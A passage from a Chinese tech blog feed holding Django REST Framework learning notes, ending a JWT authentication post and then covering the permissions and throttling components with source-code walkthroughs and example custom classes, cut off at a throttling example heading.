<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"><span class="comment"># 必须登录后才能访问 - 通过了认证权限组件</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_simplejwt.authentication <span class="keyword">import</span> JWTAuthentication</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDetail2</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    authentication_classes = [JWTAuthentication]  <span class="comment"># 局部配置simplejwt-token校验request.user</span></span><br><span class="line">    permission_classes = [IsAuthenticated]  <span class="comment"># 结合权限组件筛选掉游客</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=&#123;<span class="string">'username'</span>: request.user.username&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="url.py-1">url.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ObtainJSONWebToken视图类就是通过username和password得到user对象然后签发token（生成token）</span></span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.views <span class="keyword">import</span> ObtainJSONWebToken, obtain_jwt_token</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'simple_jwt/'</span>, TokenObtainPairView.as_view(), name=<span class="string">'token_obtain_pair'</span>),</span><br><span class="line">    path(<span class="string">'simple_jwt/refresh/'</span>, TokenRefreshView.as_view(), name=<span class="string">'token_refresh'</span>),</span><br><span class="line">    path(<span class="string">'user/detail2/'</span>, views.UserDetail2.as_view()),</span><br></pre></td></tr></table></figure>
<h1 id="参考链接-扩展阅读">参考链接 &amp; 扩展阅读</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81ZDIzZjQzZGYyNjVkYTFiY2MxOTY3NDk=">【DRF】用户注册登录及JWT<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE4LzA3L2pzb25fd2ViX3Rva2VuLXR1dG9yaWFsLmh0bWw=">JSON Web Token 入门教程<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（十二）：权限组件</title>
    <url>/tech/drf-learning-notes-12-permissions/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (12): Permissions</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcGVybWlzc2lvbnMucHk=">rest_framework.permissions<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGVybWlzc2lvbnMv">API Guild - Permissions<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEyX2RyZl9wZXJtaXNzaW9uLw==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h1 id="源码分析">源码分析</h1>
<h2 id="入口">入口</h2>
<p>从<code>rest_framework.views.APIView</code>的<code>dispath(self, request, *args, **kwargs)</code>下手，<code>dispath</code>方法内 <code>self.initial(request, *args, **kwargs)</code> 进入三大认证 - 认证组件 <code>self.perform_authentication(request)</code> - 校验用户：游客、合法用户、非法用户 - 游客：代表校验通过，直接进入下一步校验（权限校验） - 合法用户：代表校验通过，将用户存储在<code>request.user</code>中，再进入下一步校验（权限校验） - 非法用户：代表校验失败，抛出异常，返回403权限异常结果 - 权限组件 <code>self.check_permissions(request)</code> - 校验用户权限：必须登录、所有用户、登录之后读写，游客只读、自定义用户角色 - 认证通过：可以进入下一步校验（频率认证） - 认证失败：抛出异常，返回403权限异常结果 - 频率组件 <code>self.check_throttles(request)</code> - 限制视图接口被访问的频率次数 - 限制的条件(IP、id、唯一键)、频率周期时间(s、m、h)、频率的次数（3/s） - 没有达到限次：正常访问接口 - 达到限次：限制时间内不能访问，限制时间达到后，可以重新访问</p>
<p>本文介权限组件。</p>
<h2 id="rest_framework.views.apiview.initial">rest_framework.views.APIView.initial()</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">        neg = self.perform_content_negotiation(request)</span><br><span class="line">        request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">        version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">        request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">        self.perform_authentication(request) </span><br><span class="line">        self.check_permissions(request)  <span class="comment"># 权限</span></span><br><span class="line">        self.check_throttles(request)</span><br></pre></td></tr></table></figure>
<h2 id="rest_framework.views.apiview.check_permissions">rest_framework.views.APIView.check_permissions()</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_permissions</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    <span class="comment"># 遍历权限对象列表得到一个个权限对象(权限器)，进行权限认证</span></span><br><span class="line">    <span class="keyword">for</span> permission <span class="keyword">in</span> self.get_permissions():</span><br><span class="line">        <span class="comment"># 权限类一定有一个has_permission权限方法，用来做权限认证的</span></span><br><span class="line">        <span class="comment"># 参数：权限对象self、请求对象request、视图类对象</span></span><br><span class="line">        <span class="comment"># 返回值：有权限返回True，无权限返回False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> permission.has_permission(request, self):</span><br><span class="line">            self.permission_denied(</span><br><span class="line">                request, message=getattr(permission, <span class="string">'message'</span>, <span class="literal">None</span>)</span><br><span class="line">            )</span><br></pre></td></tr></table></figure>
<h2 id="rest_framework.views.apiview.get_permissions">rest_framework.views.APIView.get_permissions()</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_permissions</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Instantiates and returns the list of permissions that this view requires.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> [permission() <span class="keyword">for</span> permission <span class="keyword">in</span> self.permission_classes]</span><br></pre></td></tr></table></figure>
<h2 id="rest_framework.views.permission_classes">rest_framework.views.permission_classes</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">permission_classes = api_settings.DEFAULT_PERMISSION_CLASSES</span><br></pre></td></tr></table></figure>
<h2 id="api_settings.default_permission_classes">api_settings.DEFAULT_PERMISSION_CLASSES</h2>
<p>指向 <code>settings.DEFAULTS</code>的<code>DEFAULT_PERMISSION_CLASSES</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DEFAULTS = &#123;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'DEFAULT_PERMISSION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.permissions.AllowAny'</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<h2 id="pemissions.py">pemissions.py</h2>
<p>在源码<code>permissions.py</code>中的系统自带权限类，这里举例四个</p>
<ol type="1">
<li><code>AllowAny</code>
<ul>
<li>默认是这个权限</li>
<li>认证规则全部返还<code>True</code>：<code>return True</code></li>
<li>游客与登陆用户都有所有权限</li>
</ul></li>
<li>IsAuthenticated
<ul>
<li>常用这个</li>
<li>认证规则必须有登陆的合法用户：<code>return bool(request.user and request.user.is_authenticated)</code></li>
<li>有登录用户名并且认证成功</li>
<li>游客没有任何权限，登陆用户才有权限</li>
</ul></li>
<li>IsAdminUser
<ul>
<li>认证规则必须是后台管理用户：<code>return bool(request.user and request.user.is_staff)</code></li>
<li>游客没有任何权限，登陆用户才有权限</li>
</ul></li>
<li>IsAuthenticatedOrReadOnly
<ul>
<li>认证规则必须是只读请求或是合法用户 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> bool(</span><br><span class="line">    request.method <span class="keyword">in</span> SAFE_METHODS <span class="keyword">or</span></span><br><span class="line">    request.user <span class="keyword">and</span></span><br><span class="line">    request.user.is_authenticated</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
<li>游客只读，合法用户无限制</li>
</ul></li>
</ol>
<p>另外，<code>permission.py</code>里还定义了安全的HTTP请求方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SAFE_METHODS = (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'OPTIONS'</span>)</span><br></pre></td></tr></table></figure>
<h1 id="权限组使用">权限组使用</h1>
<h2 id="全局使用">全局使用</h2>
<p>默认全局配置的权限类是<code>AllowAny</code>，在<code>settings</code>文件中配置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 权限类配置</span></span><br><span class="line">    <span class="string">'DEFAULT_PERMISSION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.permissions.AllowAny'</span>,   <span class="comment">#默认所有权限</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="局部使用">局部使用</h2>
<p><code>views.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只有登录后才能访问</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAuthenticatedAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    permission_classes = [IsAuthenticated]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'test 登录才能访问的接口 ok'</span>)</span><br></pre></td></tr></table></figure>
<h1 id="自定义权限类">自定义权限类</h1>
<h2 id="方法">方法</h2>
<ol type="1">
<li>创建继承BasePermission的权限类</li>
<li>实现has_permission方法</li>
<li>实现体根据权限规则 确定有无权限
<ul>
<li>满足设置的用户条件，代表有权限，返回True</li>
<li>不满足设置的用户条件，代表有权限，返回False</li>
</ul></li>
<li>进行全局或局部配置</li>
</ol>
<h2 id="示例代码">示例代码</h2>
<h3 id="utils.permissions.py">utils.permissions.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> BasePermission</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> Group</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPermission</span><span class="params">(BasePermission)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_permission</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="comment"># 只读接口判断</span></span><br><span class="line">        r1 = request.method <span class="keyword">in</span> (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'OPTIONS'</span>)</span><br><span class="line">        <span class="comment"># group为有权限的分组</span></span><br><span class="line">        group = Group.objects.filter(name=<span class="string">'管理员'</span>).first()</span><br><span class="line">        <span class="comment"># groups为当前用户所属的所有分组</span></span><br><span class="line">        groups = request.user.groups.all()</span><br><span class="line">        r2 = group <span class="keyword">and</span> groups <span class="comment"># group和groups必须有值</span></span><br><span class="line">        r3 = group <span class="keyword">in</span> groups</span><br><span class="line">        <span class="comment"># 读接口大家都有权限，写接口必须为指定分组下的登陆用户</span></span><br><span class="line">        <span class="keyword">return</span> r1 <span class="keyword">or</span> (r2 <span class="keyword">and</span> r3)</span><br></pre></td></tr></table></figure>
<h3 id="views.py">views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> utils.permissions <span class="keyword">import</span> MyPermission</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 游客只读，登录用户只读，只有登录用户属于 管理员 分组，才可以增删改</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAdminOrReadOnlyAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    permission_classes = [MyPermission]</span><br><span class="line">    <span class="comment"># 所有用户都可以访问</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'自定义读 OK'</span>)</span><br><span class="line">    <span class="comment"># 必须是 自定义“管理员”分组 下的用户</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'自定义写 OK'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="urls.py">urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'test3/'</span>, views.TestAdminOrReadOnlyAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="postman测试">Postman测试</h2>
<ul>
<li><code>get</code>请求：加不加<code>Authorization</code>，都可以读</li>
<li><code>post</code>请求：不加<code>Authorization</code>，就不能进行写操作，必须要写<code>Authorization</code></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（十三）：频率组件</title>
    <url>/tech/drf-learning-notes-13-throttle/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (13): Throttle</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdGhyb3R0bGluZy5weQ==">rest_framework.throttling<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvdGhyb3R0bGluZy8=">API Guild - Throttling<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEzX2RyZl90aHJvdHRsZS8=">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h1 id="源码分析">源码分析</h1>
<h2 id="入口">入口</h2>
<p>从<code>rest_framework.views.APIView</code>的<code>dispath(self, request, *args, **kwargs)</code>下手，<code>dispath</code>方法内 <code>self.initial(request, *args, **kwargs)</code> 进入三大认证</p>
<ul>
<li>认证组件 <code>self.perform_authentication(request)</code>
<ul>
<li>校验用户：游客、合法用户、非法用户</li>
<li>游客：代表校验通过，直接进入下一步校验（权限校验）</li>
<li>合法用户：代表校验通过，将用户存储在<code>request.user</code>中，再进入下一步校验（权限校验）</li>
<li>非法用户：代表校验失败，抛出异常，返回403权限异常结果</li>
</ul></li>
<li>权限组件 <code>self.check_permissions(request)</code>
<ul>
<li>校验用户权限：必须登录、所有用户、登录之后读写，游客只读、自定义用户角色</li>
<li>认证通过：可以进入下一步校验（频率认证）</li>
<li>认证失败：抛出异常，返回403权限异常结果</li>
</ul></li>
<li>频率组件 <code>self.check_throttles(request)</code>
<ul>
<li>限制视图接口被访问的频率次数 - 限制的条件(IP、id、唯一键)、频率周期时间(s、m、h)、频率的次数（3/s）</li>
<li>没有达到限次：正常访问接口</li>
<li>达到限次：限制时间内不能访问，限制时间达到后，可以重新访问</li>
</ul></li>
</ul>
<p>本文介绍权限组件。</p>
<h2 id="views.apiview.initial">views.APIView.initial()</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">    neg = self.perform_content_negotiation(request)</span><br><span class="line">    request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">    version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">    request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">    self.perform_authentication(request)</span><br><span class="line">    self.check_permissions(request)</span><br><span class="line">    self.check_throttles(request)  <span class="comment">#频率认证</span></span><br></pre></td></tr></table></figure>
<h2 id="views.apiview.check_throttles">views.APIView.check_throttles()</h2>
<p>频率组件最重要的两个方法：<code>allow_request()</code>和<code>wait()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_throttles</span><span class="params">(self, request)</span>:</span>  <span class="comment">#频率组件核心代码</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Check if request should be throttled.</span></span><br><span class="line"><span class="string">    Raises an appropriate exception if the request is throttled.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    throttle_durations = []</span><br><span class="line">    <span class="keyword">for</span> throttle <span class="keyword">in</span> self.get_throttles():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> throttle.allow_request(request, self):</span><br><span class="line">            throttle_durations.append(throttle.wait())</span><br></pre></td></tr></table></figure>
<h3 id="views.apiview.get_throttles">views.APIView.get_throttles()</h3>
<p>出现频率配置settings信息，经过查询源码的settings文件对频率配置为空</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_throttles</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Instantiates and returns the list of throttles that this view uses.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> [throttle() <span class="keyword">for</span> throttle <span class="keyword">in</span> self.throttle_classes]  <span class="comment">#频率组件配置信息</span></span><br></pre></td></tr></table></figure>
<h3 id="throttling.simpleratethrottle">throttling.SimpleRateThrottle</h3>
<details>
<p><summary> <b><i>Source Code</i></b> </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleRateThrottle</span><span class="params">(BaseThrottle)</span>:</span></span><br><span class="line">   </span><br><span class="line">    cache = default_cache</span><br><span class="line">    timer = time.time</span><br><span class="line">    cache_format = <span class="string">'throttle_%(scope)s_%(ident)s'</span></span><br><span class="line">    scope = <span class="literal">None</span></span><br><span class="line">    THROTTLE_RATES = api_settings.DEFAULT_THROTTLE_RATES</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> getattr(self, <span class="string">'rate'</span>, <span class="literal">None</span>):</span><br><span class="line">            self.rate = self.get_rate()  <span class="comment">#3.rate值就是方法get_rate的返回值（频率次数）</span></span><br><span class="line">        self.num_requests, self.duration = self.parse_rate(self.rate)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_cache_key</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">'.get_cache_key() must be overridden'</span>)</span><br><span class="line"></span><br><span class="line">　　<span class="comment">#get_rate最后返回的结果是设置的频率次数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_rate</span><span class="params">(self)</span>:</span><span class="comment">#1.在自定义类中要给scope属性赋值</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> getattr(self, <span class="string">'scope'</span>, <span class="literal">None</span>):</span><br><span class="line">            msg = (<span class="string">"You must set either `.scope` or `.rate` for '%s' throttle"</span> %</span><br><span class="line">                   self.__class__.__name__)</span><br><span class="line">            <span class="keyword">raise</span> ImproperlyConfigured(msg)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.THROTTLE_RATES[self.scope]  <span class="comment">#2.在settings文件中配置scope属性值对应的value</span></span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            msg = <span class="string">"No default throttle rate set for '%s' scope"</span> % self.scope</span><br><span class="line">            <span class="keyword">raise</span> ImproperlyConfigured(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_rate</span><span class="params">(self, rate)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> rate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">        num, period = rate.split(<span class="string">'/'</span>)  <span class="comment">#4.rate有值，根据源码，自定义的rate值是一个字符串，而且是这种格式：'数字/以s,m,h,d之类开头的字母'</span></span><br><span class="line">        num_requests = int(num)    <span class="comment">#5.获得的数字就是设置的频率次数</span></span><br><span class="line">        duration = &#123;<span class="string">'s'</span>: <span class="number">1</span>, <span class="string">'m'</span>: <span class="number">60</span>, <span class="string">'h'</span>: <span class="number">3600</span>, <span class="string">'d'</span>: <span class="number">86400</span>&#125;[period[<span class="number">0</span>]]  <span class="comment">#6.获得是间隔的时间（以秒为单位）</span></span><br><span class="line">        <span class="keyword">return</span> (num_requests, duration)  <span class="comment">#7.数据返回给__init__，解压赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">allow_request</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.rate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">　　　　　　　　　　　<span class="comment">#get_cache_key就是要重写的方法，若不重写，会直接抛出异常</span></span><br><span class="line">        self.key = self.get_cache_key(request, view)  <span class="comment">#8.自定义的时候需要重写的方法，有返回值，放入缓存中</span></span><br><span class="line">        <span class="keyword">if</span> self.key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        self.history = self.cache.get(self.key, [])  <span class="comment">#9.获取缓存，通过key取值</span></span><br><span class="line">        self.now = self.timer()  <span class="comment">#10.当前时间</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Drop any requests from the history which have now passed the</span></span><br><span class="line">        <span class="comment"># throttle duration</span></span><br><span class="line">        <span class="keyword">while</span> self.history <span class="keyword">and</span> self.history[<span class="number">-1</span>] &lt;= self.now - self.duration:</span><br><span class="line">            self.history.pop()</span><br><span class="line">        <span class="keyword">if</span> len(self.history) &gt;= self.num_requests:</span><br><span class="line">            <span class="keyword">return</span> self.throttle_failure()</span><br><span class="line">        <span class="keyword">return</span> self.throttle_success()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">throttle_success</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.history.insert(<span class="number">0</span>, self.now)</span><br><span class="line">        self.cache.set(self.key, self.history, self.duration)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">throttle_failure</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">　　<span class="comment">#返回距下一次能请求的时间，限制的访问次数在parse_rate可以求出</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Returns the recommended next request time in seconds.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.history:</span><br><span class="line">            remaining_duration = self.duration - (self.now - self.history[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            remaining_duration = self.duration</span><br><span class="line"></span><br><span class="line">        available_requests = self.num_requests - len(self.history) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> available_requests &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> remaining_duration / float(available_requests)</span><br></pre></td></tr></table></figure>
</details>
<h2 id="再看-views.apiview.check_throttles">再看 views.APIView.check_throttles()</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_throttles</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    throttle_durations = []</span><br><span class="line">    <span class="comment"># 1）遍历配置的频率认证类，初始化得到一个个频率认证类对象（会调用频率认证类的 __init__() 方法）</span></span><br><span class="line">    <span class="comment"># 2）频率认证类对象调用 allow_request 方法，判断是否限次（没有限次可访问，限次不可访问）</span></span><br><span class="line">    <span class="comment"># 3）频率认证类对象在限次后，调用 wait 方法，获取还需等待多长时间可以进行下一次访问</span></span><br><span class="line">    <span class="comment"># 注：频率认证类都是继承 SimpleRateThrottle 类</span></span><br><span class="line">    <span class="keyword">for</span> throttle <span class="keyword">in</span> self.get_throttles():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> throttle.allow_request(request, self):</span><br><span class="line">            <span class="comment"># 只要频率限制了，allow_request 返回False了，才会调用wait</span></span><br><span class="line">            throttle_durations.append(throttle.wait())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> throttle_durations:</span><br><span class="line">                <span class="comment"># Filter out `None` values which may happen in case of config / rate</span></span><br><span class="line">                <span class="comment"># changes, see #1438</span></span><br><span class="line">                durations = [</span><br><span class="line">                    duration <span class="keyword">for</span> duration <span class="keyword">in</span> throttle_durations</span><br><span class="line">                    <span class="keyword">if</span> duration <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">                ]</span><br><span class="line"></span><br><span class="line">                duration = max(durations, default=<span class="literal">None</span>)</span><br><span class="line">                self.throttled(request, duration)</span><br></pre></td></tr></table></figure>
<h1 id="自定义频率类">自定义频率类</h1>
<h2 id="方法">方法</h2>
<ol type="1">
<li>自定义一个继承 <code>SimpleRateThrottle</code> 类 的频率类</li>
<li>设置一个 <code>scope</code> 类属性，属性值为任意见名知意的字符串</li>
<li>在settings配置文件中，配置drf的<code>DEFAULT_THROTTLE_RATES</code>，格式为 <code>{scope字符串值: '次数/时间'}</code></li>
<li>在自定义频率类中重写 get_cache_key 方法
<ul>
<li>限制的对象返回 与限制信息有关的字符串</li>
<li>不限制的对象返回 <code>None</code> (只能放回<code>None</code>，不能是<code>False</code>或是<code>''</code>等)</li>
</ul></li>
</ol>
<h2 id="示例代码">示例代码</h2>
